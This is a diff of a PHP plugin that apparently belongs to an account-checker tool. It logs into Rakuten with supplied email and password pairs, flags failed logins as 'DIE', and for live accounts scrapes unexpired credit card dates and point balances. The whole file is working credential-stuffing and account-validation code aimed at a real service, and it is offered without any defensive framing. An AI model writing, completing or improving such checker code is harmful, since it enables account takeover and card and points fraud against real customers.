@@ -1,9 +1,11 @@
 <?php
 class check_rakuten extends plugins {
-	public $id = "rakuten";
-	public $name = "Check rakuten";
-	public $version = "1.0.0";
-	public $descrition = "Check rakuten acc, points and credit cards";
+	public $meta = array(
+		'id' 	=> "rakuten",
+		'name' => "Check rakuten",
+		'version' => "1.0.0",
+		'descrition' => "Check rakuten acc, points and credit cards"
+	);
 
 	public $fields = array(
 		"status" => "str",
@@ -16,13 +18,12 @@ class check_rakuten extends plugins {
 	}
 
 	private function runCheck($m,$p,$check_card=false,$check_point=false) {
-		// delete old cookie
-		$this->startSession();
+		$session = new Session();
 
 		$return = array();
 
 		$ref = "https://member.id.rakuten.co.jp/rms/nid/menufwd?scid=wi_gmx_myr_up_reg";
-		$this->connect($ref);
+		#$session->connect($ref);
 
 		// check
 		$data = array('u'=>$m,'p'=>$p,
@@ -31,7 +32,8 @@ class check_rakuten extends plugins {
 		);
 		$url = 'https://member.id.rakuten.co.jp/rms/nid/loginmember';
 
-		if (strpos($this->connect($url,$ref,$data),'Set-cookie: Ib=') === false) {
+		$html = $session->connect($url,$ref,$data,array("curl"=>array(CURLOPT_NOBODY => 1)));
+		if (strpos($html,'Set-Cookie: Ib=') === false) {
 			$return['status'] = "DIE";
 			return $return;
 		}
@@ -42,7 +44,7 @@ class check_rakuten extends plugins {
 			$r = array();
 			$mon = intval(date('n'));
 			$y = intval(date('Y'));
-			if (preg_match_all('/(20[0-9][0-9])\/([0-9][0-9])/',$this->connect($url,$ref),$match,PREG_SET_ORDER)) {
+			if (preg_match_all('/(20[0-9][0-9])\/([0-9][0-9])/',$session->connect($url,$ref),$match,PREG_SET_ORDER)) {
 				foreach ($match as $m) {
 					if ($m[1]>$y||($m[1]==$y&&$m[2]>=$mon)) $r[] = $m[0];
 				}
@@ -52,7 +54,7 @@ class check_rakuten extends plugins {
 		}
 
 		if ($check_point) {
-			if (preg_match('/総保有ポイント<\/dt>\s*<dd>([0-9,]*)<\/dd>/',$this->connect("https://point.rakuten.co.jp/"),$match)) {
+			if (preg_match('/総保有ポイント<\/dt>\s*<dd>([0-9,]*)<\/dd>/',$session->connect("https://point.rakuten.co.jp/"),$match)) {
 				$return['point'] = str_replace(",","",$match[1]);
 			} else {
 				$return['point'] = -1;
